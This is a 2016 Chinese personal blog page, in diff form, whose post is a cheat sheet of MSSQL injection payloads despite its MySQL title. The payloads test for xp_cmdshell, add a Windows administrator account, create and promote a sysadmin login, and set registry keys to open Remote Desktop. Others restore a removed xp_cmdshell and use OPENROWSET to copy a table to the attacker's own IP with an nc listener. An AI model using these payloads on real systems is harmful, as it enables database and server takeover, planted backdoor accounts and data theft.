@@ -1,0 +1,242 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Mysql注入思考 | 小峰&#39;s Blog</title>
+  <meta name="author" content="xiaofeng">
+  
+  <meta name="description" content="mssql注入经常使用的命令查看是否存在xp_cmdshelland 1=(select count(*) from master.dbo.sysobjects where xtype = ‘x’ and name = ‘xp_cmdshell’)
+用xp_cmdshell执行命令;exec mas">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Mysql注入思考"/>
+  <meta property="og:site_name" content="小峰&#39;s Blog"/>
+
+  
+    <meta property="og:image" content="undefined"/>
+  
+
+  <link href="/favicon.png" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="小峰&#39;s Blog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  
+
+<a href="https://github.com/xiaofengtongxue/xiaofengtongxue.github.io.git" target="_blank">
+<img style="position: absolute; top: 0; left: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_left_white_ffffff.png" alt="Fork me on GitHub">
+</a>
+</head>
+
+
+<body>
+  <header id="header" class="inner"><div class="alignleft">
+  <h1><a href="/">小峰&#39;s Blog</a></h1>
+  <h2><a href="/">一个不抽烟 不喝酒的少年</a></h2>
+</div>
+<nav id="main-nav" class="alignright">
+  <ul>
+    
+      <li><a href="/">Home</a></li>
+    
+      <li><a href="/archives">Archives</a></li>
+    
+      <li><a href="//about">About</a></li>
+    
+  </ul>
+  <div class="clearfix"></div>
+</nav>
+<div class="clearfix"></div>
+</header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2016-07-28T09:25:06.000Z"><a href="/2016/07/28/24/">2016-07-28</a></time>
+      
+      
+  
+    <h1 class="title">Mysql注入思考</h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h3 id="mssql注入经常使用的命令"><a href="#mssql注入经常使用的命令" class="headerlink" title="mssql注入经常使用的命令"></a>mssql注入经常使用的命令</h3><h2 id="查看是否存在xp-cmdshell"><a href="#查看是否存在xp-cmdshell" class="headerlink" title="查看是否存在xp_cmdshell"></a>查看是否存在xp_cmdshell</h2><pre><code>and 1=(select count(*) from master.dbo.sysobjects where xtype = ‘x’ and name = ‘xp_cmdshell’)
+</code></pre><h2 id="用xp-cmdshell执行命令"><a href="#用xp-cmdshell执行命令" class="headerlink" title="用xp_cmdshell执行命令"></a>用xp_cmdshell执行命令</h2><pre><code>;exec master..xp_cmdshell “net user name password /add”–
+;exec master..xp_cmdshell “net localgroup name administrators /add”–
+</code></pre><h2 id="查看权限"><a href="#查看权限" class="headerlink" title="查看权限"></a>查看权限</h2><pre><code>and (select IS_SRVROLEMEMBER(‘sysadmin’))=1–  //sa
+and (select IS_MEMBER(‘db_owner’))=1–   //  dbo
+and (select IS_MEMBER(‘public’))=1–  //public
+</code></pre><h2 id="创建个登陆mssql的帐号"><a href="#创建个登陆mssql的帐号" class="headerlink" title="创建个登陆mssql的帐号"></a>创建个登陆mssql的帐号</h2><pre><code>;exec master.dbo.sp_addlogin name,pass;–
+</code></pre><h2 id="把创建的mssql登陆帐号提升到sysadmin"><a href="#把创建的mssql登陆帐号提升到sysadmin" class="headerlink" title="把创建的mssql登陆帐号提升到sysadmin"></a>把创建的mssql登陆帐号提升到sysadmin</h2><pre><code>;exec master.dbo.sp_addsrvrolemember name,sysadmin;–
+</code></pre><h2 id="开3389远程端口"><a href="#开3389远程端口" class="headerlink" title="开3389远程端口"></a>开3389远程端口</h2><pre><code>‘exec master..xp_regwrite @r,’software\microsoft\windows\currentversion\netcache’,’enable’,’reg_sz’,’0′;—-
+;declare @r varchar(255) set @r=’HKEY_LOCAL_MACHINE’exec master..xp_regwrite @r,’software\microsoft\windows nt\currentversion\winlogon’,’shutdownwithoutlogon’,’reg_sz’,’0′;—-
+;declare @r varchar(255) set @r=’HKEY_LOCAL_MACHINE’exec master..xp_regwrite @r,’software\policies\microsoft\windows\installer’,’enableadmintsremote’,’reg_dword’,1;—-
+;declare @r varchar(255) set @r=’HKEY_LOCAL_MACHINE’exec master..xp_regwrite @r,’system\currentcontrolset\control\terminal server’,’Tsenabled’,’reg_dword’,1;—-
+;declare @r varchar(255) set @r=’HKEY_LOCAL_MACHINE’exec master..xp_regwrite @r,’system\currentcontrolset\services\termdd’,’start’,’reg_dword’,2;—-
+;declare @r varchar(255) set @r=’HKEY_LOCAL_MACHINE’exec master..xp_regwrite @r,’system\currentcontrolset\services\termservice’,’start’,’reg_dword’,2;—-
+;declare @r varchar(255) set @r=’HKEY_LOCAL_MACHINE’exec master..xp_regwrite ‘hkey_users’,’.default\keyboard layout\toggle’,’hotkey’,’reg_sz’,’1′;—-
+;declare @r varchar(255) set @r=’HKEY_LOCAL_MACHINE’exec master..xp_cmdshell ‘iisreset /reboot’;—-
+</code></pre><h2 id="xp-cmdshell的删除及恢复"><a href="#xp-cmdshell的删除及恢复" class="headerlink" title="xp_cmdshell的删除及恢复"></a>xp_cmdshell的删除及恢复</h2><h4 id="1、恢复xp-cmdshell的方法"><a href="#1、恢复xp-cmdshell的方法" class="headerlink" title="1、恢复xp_cmdshell的方法"></a>1、恢复xp_cmdshell的方法</h4><p>删除扩展存储过过程xp_cmdshell的语句   </p>
+<pre><code>exec sp_dropextendedproc ’xp_cmdshell’  
+</code></pre><h4 id="2、恢复cmdshell的sql语句"><a href="#2、恢复cmdshell的sql语句" class="headerlink" title="2、恢复cmdshell的sql语句"></a>2、恢复cmdshell的sql语句</h4><pre><code>exec sp_addextendedproc xp_cmdshell ,@dllname =’xplog70.dll’  
+exec master.dbo.addextendedproc ’xp_cmdshell’,’xplog70.dll’;select count(*) from master.dbo.sysobjects where xtype=’x’ and   
+</code></pre><p>返回结果为1就ok<br>否则需上传c:\inetput\web\xplog70.dll后   </p>
+<pre><code>exec master.dbo.sp_addextendedproc ’xp_cmdshell’,’c:\inetput\web\xplog70.dll’;–  
+</code></pre><h4 id="3、如果是用以下方法删除"><a href="#3、如果是用以下方法删除" class="headerlink" title="3、如果是用以下方法删除"></a>3、如果是用以下方法删除</h4><pre><code>drop procedure sp_addextendedproc   
+drop procedure sp_oacreate   
+exec sp_dropextendedproc ’xp_cmdshell’  
+</code></pre><p>则可以用以下语句恢复   </p>
+<pre><code>dbcc addextendedproc (“sp_oacreate”,”odsole70.dll”)   
+dbcc addextendedproc (“xp_cmdshell”,”xplog70.dll”)   
+</code></pre><p>这样可以直接恢复，不用去管sp_addextendedproc是不是存在</p>
+<h2 id="在db权限并且分离获取mssql数据库服务器ip的方法"><a href="#在db权限并且分离获取mssql数据库服务器ip的方法" class="headerlink" title="在db权限并且分离获取mssql数据库服务器ip的方法"></a>在db权限并且分离获取mssql数据库服务器ip的方法</h2><h4 id="1-本地nc监听-nc-vvlp-80"><a href="#1-本地nc监听-nc-vvlp-80" class="headerlink" title="1.本地nc监听  nc -vvlp 80"></a>1.本地nc监听  nc -vvlp 80</h4><h4 id="2-insert-into-OPENROWSET-‘SQLOLEDB’-’uid-sa-pwd-xxx-Network-DBMSSOCN-Address-你的ip-80-’-‘select-from-dest-table’-select-from-src-table-–"><a href="#2-insert-into-OPENROWSET-‘SQLOLEDB’-’uid-sa-pwd-xxx-Network-DBMSSOCN-Address-你的ip-80-’-‘select-from-dest-table’-select-from-src-table-–" class="headerlink" title="2.;insert into OPENROWSET(‘SQLOLEDB’,’uid=sa;pwd=xxx;Network=DBMSSOCN;Address=你的ip,80;’, ‘select  from dest_table’) select  from src_table;–"></a>2.;insert into OPENROWSET(‘SQLOLEDB’,’uid=sa;pwd=xxx;Network=DBMSSOCN;Address=你的ip,80;’, ‘select <em> from dest_table’) select </em> from src_table;–</h4>
+      
+    </div>
+    <footer>
+      
+        
+        
+  
+  <div class="tags">
+    <a href="/tags/php/">php</a>
+  </div>
+
+        <div class="bdsharebuttonbox">
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone"></a>
+    <a href="#" class="bds_tsina" data-cmd="tsina"></a>
+    <a href="#" class="bds_tqq" data-cmd="tqq"></a>
+    <a href="#" class="bds_renren" data-cmd="renren"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin"></a>
+</div>
+
+<script>
+    window._bd_share_config = {
+        "common": {
+            "bdSnsKey": {},
+            "bdText": "",
+            "bdMini": "2",
+            "bdPic": "",
+            "bdStyle": "0",
+            "bdSize": "16"
+        },
+        "share": {},
+        "image": {
+            "viewList": ["qzone", "tsina", "tqq", "renren", "weixin"],
+            "viewText": “分享到",
+            "viewSize": "16"
+        },
+        "selectShare": {
+            "bdContainerClass": null,
+            "bdSelectMiniList": ["qzone", "tsina", "tqq", "renren", "weixin"]
+        }
+    };
+    with(document) 0[(getElementsByTagName('head')[0] || body).appendChild(createElement('script')).src = 'http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion=' + ~(-new Date() / 36e5)];
+</script>
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+  <h1 class="title">Kommentare</h1>
+
+  
+      <div id="fb-root"></div>
+<script>
+  (function(d, s, id) {
+    var js, fjs = d.getElementsByTagName(s)[0];
+    if (d.getElementById(id)) return;
+    js = d.createElement(s); js.id = id;
+    js.src = "//connect.facebook.net/en_US/all.js#xfbml=1&appId=123456789012345";
+    fjs.parentNode.insertBefore(js, fjs);
+  }(document, 'script', 'facebook-jssdk'));
+</script>
+
+<div class="fb-comments" data-href="http://yoursite.com/2016/07/28/24/index.html" data-num-posts="5" data-width="840" data-colorscheme="light"></div>
+      
+  
+</section>
+
+</div></div>
+    <aside id="sidebar" class="alignright">
+  <SCRIPT language=javascript>
+function search(formname) {
+    formname.method = "get";
+    formname.action = "http://www.baidu.com/baidu";
+    document.search_form.word.value = document.search_form.word.value + " site:mjiayou.com";
+    return true;
+}
+</SCRIPT>
+
+<div class="search">
+    <form name="search_form" target="_blank" onsubmit="search(this)">
+        <input type="search" name="word" results="0" placeholder="百度站内搜索" onblur="this.value=''">
+        <!-- <input type="submit" value="搜索"> -->
+    </form>
+</div>
+
+  
+
+  
+<div class="widget tag">
+  <h3 class="title">Tags</h3>
+  <ul class="entry">
+  
+    <li><a href="/tags/Linux基础/">Linux基础</a><small>4</small></li>
+  
+    <li><a href="/tags/php/">php</a><small>6</small></li>
+  
+    <li><a href="/tags/python/">python</a><small>5</small></li>
+  
+    <li><a href="/tags/web安全/">web安全</a><small>5</small></li>
+  
+    <li><a href="/tags/渗透学习/">渗透学习</a><small>4</small></li>
+  
+    <li><a href="/tags/渗透工具/">渗透工具</a><small>1</small></li>
+  
+    <li><a href="/tags/生活感悟/">生活感悟</a><small>2</small></li>
+  
+    <li><a href="/tags/经验总结/">经验总结</a><small>1</small></li>
+  
+    <li><a href="/tags/读书笔记/">读书笔记</a><small>2</small></li>
+  
+  </ul>
+</div>
+
+
+  <iframe width="100%" height="550" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=550&fansRow=1&ptype=1&speed=0&skin=3&isTitle=0&noborder=1&isWeibo=0&isFans=0&uid=3869837461&verifier=7b3bd9e7&dpc=1"></iframe>
+</aside>
+    <div class="clearfix"></div>
+  </div>
+  <footer id="footer" class="inner"><div class="alignleft">
+  
+  &copy; 2016 xiaofeng
+  
+</div>
+<div class="clearfix"></div></footer>
+  <script src="//ajax.useso.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+</body>
+</html>
